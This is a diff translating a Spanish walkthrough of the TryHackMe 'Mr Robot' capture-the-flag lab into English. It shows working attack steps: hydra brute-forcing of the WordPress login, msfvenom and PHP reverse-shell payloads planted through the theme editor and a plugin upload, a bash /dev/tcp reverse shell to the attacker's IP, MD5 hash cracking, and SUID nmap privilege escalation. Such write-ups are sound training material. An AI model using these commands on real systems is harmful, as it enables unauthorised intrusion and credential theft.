@@ -1,20 +1,20 @@
 # Mr Robot CTF
 
-## Información General
+## General information
 
-<h3>Dificultad: <img src="https://img.shields.io/badge/medio-orange?style=flat-square"> </h3>
+<h3>Difficulty: <img src="https://img.shields.io/badge/medium-orange?style=flat-square"> </h3>
 
-<h3> Sistema operativo: Linux</h3> 
+<h3> Operating system: Linux</h3> 
 
-<h3> Fecha de resolución: 14/06/2025 </h3>
+<h3> Resolution date: 06/14/2025 </h3>
 
-<h3>Enlace de la mv: <a href="https://tryhackme.com/room/mrrobot" target="_blank">Mr Robot CTF</a></h3>
+<h3>MV link: <a href="https://tryhackme.com/room/mrrobot" target="_blank">Mr Robot CTF</a></h3>
 
-### *Leer el documentro en ingles* <a href="Mr_Robot_CTF_Ingles.md">Mr Robot CTF</a>
+### *Read the document in español* <a href="Mr_Robot_CTF.md">Mr Robot CTF</a>
 
-## Reconocimiento
+## Recognition
 
-TryHackme nos proporciona la ip de la máquina objetivo 10.10.78.104
+TryHackme gives us the IP of the target machine 10.10.78.104
 
 ### Ping
 
@@ -26,9 +26,9 @@ ping -c 1 10.10.78.104
 <img src="images/ping.png" width="600" alt="Resultado de Nmap">
 </p>
 
-**Si el ttl=63 es Linux**
+**If the ttl=63 is Linux**
 
-Usaremos nmap, con el siguiente comando:
+We will use nmap, with the following command:
 
 ```
 sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.10.78.104
@@ -49,9 +49,9 @@ sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.10.78.104
 
 </div>
 
-## Exploración
+## Exploration
 
-En el navegador entramos en la siguiente url
+In the browser we enter the following URL
 
 ```
 http://10.10.78.104:443/
@@ -61,19 +61,19 @@ http://10.10.78.104:443/
 <img src="images/bad_request.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Añadimos **HTTPS** al url, por tanto:
+We add **HTTPS** to the URL, therefore:
 
 ```
 https://10.10.78.104:443/
 ```
 
-Investigando, estos son los diferentes paths que nos podemos encontrar asociado en este protocolo, pero no encontramos nada interesante
+Investigating, these are the different paths that we can find associated with this protocol, but we did not find anything interesting.
 
 <p align="center"> 
 <img src="images/paths.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Quiero saber si hay mas paths oculto en este protocolo, por tanto llevaré acabo fuzzing web:
+I want to know if there are more hidden paths in this protocol, so I will perform web fuzzing:
 
 ```
 gobuster dir -u http://10.10.78.104/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
@@ -82,11 +82,11 @@ gobuster dir -u http://10.10.78.104/ -w /usr/share/wordlists/dirbuster/directory
 <img src="images/fuzzingweb.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Estamos antes una pagina web wordpress porque tiene rutas **wp-content** , **wp-login** t **wp-includes**
+We are dealing with a WordPress website because it has paths **wp-content** , **wp-login** , and **wp-includes**
 
-**A continuación, voy a ir investigar cada paths que me ha dado este comando:**
+**Next, I'm going to investigate each path this command gave me:**
 
-Escribiendo el **/login** he encontrado el **login.php**
+By typing **/login** I found **login.php**
 
 ```
 https://10.10.78.104/wp-login.php
@@ -96,7 +96,7 @@ https://10.10.78.104/wp-login.php
 <img src="images/loginphp.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Escribiendo **/robots** he encontrado algo muy interesante:
+Typing **/robots** I found something very interesting:
 
 ```
 http://10.10.78.104/robots
@@ -106,7 +106,7 @@ http://10.10.78.104/robots
 <img src="images/robots.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Escribo en el navegador lo siguiente:
+I type the following into the browser:
 
 ```
 http://10.10.78.104/key-1-of-3.txt
@@ -116,9 +116,9 @@ http://10.10.78.104/key-1-of-3.txt
 <img src="images/primeraRedFlag.png" width="600" alt="Resultado de Nmap">
 </p>
 
-**Nos encontramos nuestra primera bandera**
+**We found our first flag**
 
-Además, me encuentro un diccionario
+Also, I find a dictionary
 
 ```
 http://10.10.78.104/fsocity.dic
@@ -127,21 +127,21 @@ http://10.10.78.104/fsocity.dic
 <img src="images/diccionario.png" width="600" alt="Resultado de Nmap">
 </p>
 
-### A continuación voy a explicar dos formas de como conseguir el usuario y contraseña para el loging de Wordpress
+### Below, I will explain two ways to get the username and password for Wordpress login.
 
-### Primera forma:
+### First form:
 
-Tenemos que interceptar el fallo del login en wordpress, para ellos usaremos **burp suite**
+We need to intercept the login failure in WordPress. To do this, we'll use Burp Suite.
 
-Primero en nuestro navegador tenemos que tener lo siguiente preparado:
+First, we need to have the following ready in our browser:
 
-**Settings - en el buscador (proxy) - Settings - Manual proxy configurations**
+Settings - in the search engine (proxy) - Settings - Manual proxy configurations.
 
 <p align="center"> 
 <img src="images/burpsuite.png" width="600" alt="Resultado de Nmap">
 </p>
 
-En burp suite, nos vamos a:
+In burp suite, we go to:
 
 **Proxy - Intercept - Intercept on**
 
@@ -149,24 +149,24 @@ En burp suite, nos vamos a:
 <img src="images/burpsuite2.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Luego en el el navegador, introducimos malamente las credenciales
+Then in the browser, we enter the credentials incorrectly.
 
 <p align="center"> 
 <img src="images/burpsuite3.png" width="600" alt="Resultado de Nmap">
 </p>
 
-¡¡El error es muy importante!!, lo tenemos en cuenta. Luego en **burp suite** habrá interceptado los datos de la pagina:
+The error is very important!! Then, in **burp suite**, you will have intercepted the page data:
 
 <p align="center"> 
 <img src="images/burpsuite4.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Este formulario HTML tradicional, usa **Post**, por tanto el módulo que usaremos en el comando **hydra** para hacer fuerza bruta  es **http-post-form**, por otro lado, esta línea tenemos que modificarla
+This traditional HTML form uses **Post**, therefore, the module that we will use in the **hydra** command to brute force it is **http-post-form**, on the other hand, we have to modify this line
 
 ```
 log=robots&pwd=sdadas&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.195.102%2Fwp-admin%2F&testcookie=1
 ```
-hay que cambiarlo por:
+it must be changed to:
 
 ```
 log=^USER^
@@ -174,13 +174,13 @@ pwd=^PASS^
 F=Invalid username
 ```
 
-Por tanto, la línea modificada quedaría así:
+Therefore, the modified line would be as follows:
 
 ```
 log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.195.102%2Fwp-admin%2F&testcookie=1:F=Invalid username
 ```
 
-Por tanto, el comando usado en hydra, sería:
+Therefore, the command used in hydra would be:
 
 ```
 hydra -L fsocity.dic -p robots 10.10.195.102 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
@@ -190,20 +190,21 @@ hydra -L fsocity.dic -p robots 10.10.195.102 http-post-form "/wp-login/:log=^USE
 <img src="images/hydra2.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Luego para conseguir la contraseña, el comando tiene que variar un poco:
+Then, to get the password, the command has to vary a little:
 
-En esta línea
+On this line
 ```
 log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.195.102%2Fwp-admin%2F&testcookie=1:F=Invalid username
 ```
-solo cambiaría lo del final por 
+
+I would only change the ending for
 
 ```
 S=302
 ```
-Usamos S=302 lo usamos en wordpress porque significa entrega **exitoso**.
+We use S=302 is used in wordpress because it means **successful**
 
-Por tanto el comando en cuestión sería:
+Therefore the command in question would be:
 
 ```
 hydra -l elliot -P fsocity.dic 10.10.224.56 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.224.56%2Fwp-admin%2F&testcookie=1:S=302"
@@ -213,18 +214,17 @@ hydra -l elliot -P fsocity.dic 10.10.224.56 http-post-form "/wp-login/:log=^USER
 <img src="images/hydra1.png" width="600" alt="Resultado de Nmap">
 </p>
 
-**Lo malo, es que te tarda bastante en sacarte la contraseña, ya que el diccionario es muuuuuuuuuuuuuuuuuuy, más de 15 minutos tarda**
+**The bad thing is that it takes a long time to get the password, since the dictionary is veeeery long, it takes more than 15 minutes**
 
-No olvidemos de ir a **Settings - en el buscador (proxy) - Settings - No proxy**
-Sino, no nos funcionará la página.
+Don't forget to go to **Settings - in the search engine (proxy) - Settings - No proxy**. Otherwise, the page won't work.
 
 <p align="center"> 
 <img src="images/proxy2.png" width="600" alt="Resultado de Nmap">
 </p>
 
-### Segunda forma:
+### Second form:
 
-Tenemos que visitara al siguiente enlace e irnos al final:
+We have to visit the following link and go to the end:
 
 ```
 http://10.10.78.104/license
@@ -234,11 +234,11 @@ http://10.10.78.104/license
 <img src="images/license.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Esto me suena que está codificado en **base64**
+This is encoded in **base64**
 
-*ZWxsaW90OkVSMjgtMDY1Mgo=*
+**ZWxsaW90OkVSMjgtMDY1Mgo=**
 
-El comando que uso para descodificarlo es:
+The command I use to decode it is:
 
 ```
 echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
@@ -248,45 +248,47 @@ echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
 <img src="images/base64.png" width="600" alt="Resultado de Nmap">
 </p>
 
-El usuario es elliot
-La contraseña es **ER28-0652**
+The username is Elliot
+The password is **ER28-0652**
 
 <p align="center"> 
 <img src="images/wordpress.png" width="600" alt="Resultado de Nmap">
 </p>
 
-## Explotación
+## Exploitation
 
-Podemos hacerlo de dos dormas:
+We can do it in two ways:
 
-### Primera forma
+### First form
 
-Para explotar este Wordpress nos venimos a **appearance** - **editor** y nos situamos en **404 Template** (Página de error)
+To use this WordPress we go to **appearance** - **editor** and go to **404 Template** (Error Page)
 
 <p align="center"> 
 <img src="images/404.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Borramos todo, a continuación, creamos un archivo malicioso mfsvenom
+Delete everything, then we create a malicious msfvenom file
 
 ```
 msfvenom -p php/reverse_php LHOST=10.8.139.36 LPORT=443 -f raw > wordpress.php
 ```
-Luego, copiamos todo el contenido de **wordpress.php**  y lo copiamos en **404 Template** de Wordpress
+
+Then, we copy all the content from **wordpress.php** and copy it into **404 Template** of Wordpress
+
 
 <p align="center"> 
 <img src="images/4042.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Le damos a **update file**
+We give **update file**
 
-Preparamos el puerto de escucha en nuestra kali:
+We prepare the listening port on our Kali:
 
 ```
 sudo nc -lvnp 443
 ```
 
-Recargo la pagina de error 404
+Reload the 404 error page
 
 ```
 http://10.10.17.188/404.php
@@ -296,31 +298,31 @@ http://10.10.17.188/404.php
 <img src="images/explotado1.png" width="600" alt="Resultado de Nmap">
 </p>
 
-### Segunda forma
+### Second form
 
-Irte a **plugins - Add new - upload plugin**
+Go to **plugins - Add new - upload plugin**
 
 <p align="center"> 
 <img src="images/pluggins.png" width="600" alt="Resultado de Nmap">
 </p>
 
 
-En la kali usa los siguiente comandos:
+In the kali we use the following commands:
 
 ```
 cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/Desktop
 ```
 
-Aquí es donde se encuentra la plantilla que tenemos que editar 
+This is where the template we need to edit is located:
 **/usr/share/webshells/php/php-reverse-shell.php**
 
-Luego ese fichero que nos hemos traído al escritorio hay que editarlo para que wordpress nos lo detecte:
+Then we need to edit the file we brought to the desktop so WordPress can detect it:
 
 <p align="center"> 
 <img src="images/reverse_shell.png" width="600" alt="Resultado de Nmap">
 </p>
 
-**Es muy importante, añadir lo que hemos señalado porque sino wordpress no nos dejará subir el plugins**
+**It is very important to add what we have indicated because otherwise WordPress will not let us upload the plugin**
 
 ```
 /*
@@ -335,7 +337,7 @@ Domain Path: /languages
 */
 ```
 
-Lo siguiente sirve para prepara restablecer la shell de la maquina objetivo en nuestra kali, en mi caso, sería así:
+The following is used to prepare to reset the shell of the target machine in our Kali, in my case, it would be like this:
 
 <p align="center"> 
 <img src="images/reverseshell2.png" width="600" alt="Resultado de Nmap">
@@ -346,36 +348,37 @@ $ip = '10.10.78.104';
 $port = 444;       
 ```
 
-**Lo guardamos dentro de una carpeta y lo comprimimos en .zip**
+**We save it in a folder and compress it in .zip**
 
 <p align="center"> 
 <img src="images/zip.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Activamos el puerto de escucha:
+We activate the listening port:
 
 ```
 nc -lvp 444
 ```
-Activamos el plugins
+We activate the plugins
 
 <p align="center"> 
 <img src="images/revershelhell3.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Resultado:
+Result:
 
 <p align="center"> 
 <img src="images/Explotacion2.png" width="600" alt="Resultado de Nmap">
 </p>
 
-## Tenemos que conseguir una conexión más estable
+## We need to get a more stable connection
 
-Por tanto, en otra terminal, activamos el puerto de escucha:
+Therefore, in another terminal, we activate the listening port:
 ```
 sudo nc -lvnp 4444
 ```
-Luego, en las sesión reciente abierta, metemos este comando:
+
+Then, in the recently opened session, we enter this command:
 
 ```
 bash -c "sh -i >& /dev/tcp/10.8.139.36/4444 0>&1"
@@ -384,7 +387,7 @@ bash -c "sh -i >& /dev/tcp/10.8.139.36/4444 0>&1"
 <img src="images/conexion_estable.png" width="600" alt="Resultado de Nmap">
 </p>
 
-### Tratamiento de la TTY
+### TTY
 
 ```
 script /dev/null -c bash
@@ -397,9 +400,9 @@ reset xterm
 export TERM=xterm
 export SHELL=bash
 ```
-### Sino funciona la TTY tenemos la alternativa de Python
+### If the TTY doesn't work we have the Python alternative
 
-En alternativa de la tty, usaremos este comando:
+As an alternative to the tty, we will use this command:
 
 ```
 python -c "import pty;pty.spawn('/bin/bash')"
@@ -411,7 +414,7 @@ python -c "import pty;pty.spawn('/bin/bash')"
 
 -------------------------------------------------------
 
-Nos situamos en /home/robot
+We go to /home/robot
 
 <p align="center"> 
 <img src="images/robot.png" width="600" alt="Resultado de Nmap">
@@ -419,30 +422,30 @@ Nos situamos en /home/robot
 
 robot:c3fcd3d76192e4007dfb496cca67e13b
 
-usuario robot
-contraseña hasheada en md5
+robot user
+MD5-hashed password
 
-**Lo podemos hacer de dos forma**
+**We can do it in two ways**
 
-### Primer forma
+### First form
 
-Nos vamos a esta pagina: <a href="https://iotools.cloud/es/tool/md5-decrypt/" target="_blank">Desencriptar md5</a>
+We go to this page: <a href="https://iotools.cloud/es/tool/md5-decrypt/" target="_blank"> Decrypt md5 </a>
 
 <p align="center"> 
 <img src="images/md51.png" width="600" alt="Resultado de Nmap">
 </p>
 
-La contraseña es abcdefghijklmnopqrstuvwxyz
+The password is abcdefghijklmnopqrstuvwxyz
 
-### Segunda forma
+### Second form
 
-Usamos este comando:
+We use this command:
 
 ```
 hashcat -m 0 md5.txt /usr/share/wordlists/rockyou.txt
 ```
-**-m 0 -->** Significa que estas descodificando md5\
-**md5.txt** --> Es donde guardamos el hash md5
+**-m 0 -->** It means you are decoding md5\
+**md5.txt** --> It is where we store the md5 hash
 
 <p align="center"> 
 <img src="images/md52.png" width="600" alt="Resultado de Nmap">
@@ -450,7 +453,7 @@ hashcat -m 0 md5.txt /usr/share/wordlists/rockyou.txt
 
 --------------------------------
 
-**NO OLVIDEMOS QUE TENEMOS EL PUERTO SSH ABIERTO**
+**LET'S NOT FORGET THAT WE HAVE THE SSH PORT OPEN**
 
 ```
 ssh robot@10.10.17.188
@@ -460,9 +463,9 @@ abcdefghijklmnopqrstuvwxyz
 <img src="images/2redflag.png" width="600" alt="Resultado de Nmap">
 </p>
 
-**Segunda bandera conseguida**
+**Second flag obtained**
 
-# Escalada de Privilegios
+# Privilege Escalation
 
 Realizamos el siguiente comando:
 
@@ -474,17 +477,17 @@ find / -perm -4000 2>/dev/null
 <img src="images/nmap2.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Luego visitamos esta pagina: <a href="https://gtfobins.github.io" target="_blank">Gtfobins</a>
+Then we visit this page: <a href="https://gtfobins.github.io" target="_blank">Gtfobins</a>
 
-Descubrimos que con **nmap** hay vulnerabilidad, **pero no funciona con la pagina gtfobins. Por tanto investigamos en internet**
+We discovered that it has a vulnerability with **nmap**, but it doesn't work with the gtfobins page. So we investigated online.
 
-Me encuentro esta página interesante: <a href="https://w0lfram1te.com/privilege-escalation-with-nmap" target="_blank">Ruta alternativa</a>
+I find this page interesting: <a href="https://w0lfram1te.com/privilege-escalation-with-nmap" target="_blank">Alternative route</a>
 
 <p align="center"> 
 <img src="images/nmap3.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Ejecutando este comando, conseguimos root
+By running this command, we get root
 
 ```
 nmap --interactive
@@ -495,7 +498,7 @@ nmap --interactive
 <img src="images/nmap4.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Luego hacemos lo siguiente para alcanzar la tercera bandera
+Then we do the following to reach the third flag
 
 ```
 cd /root
@@ -506,7 +509,7 @@ cat key-3-of-3.txt
 <img src="images/3redflag.png" width="600" alt="Resultado de Nmap">
 </p>
 
-**Tercera bandera conseguida**
+**Third flag achieved**
 
 
 
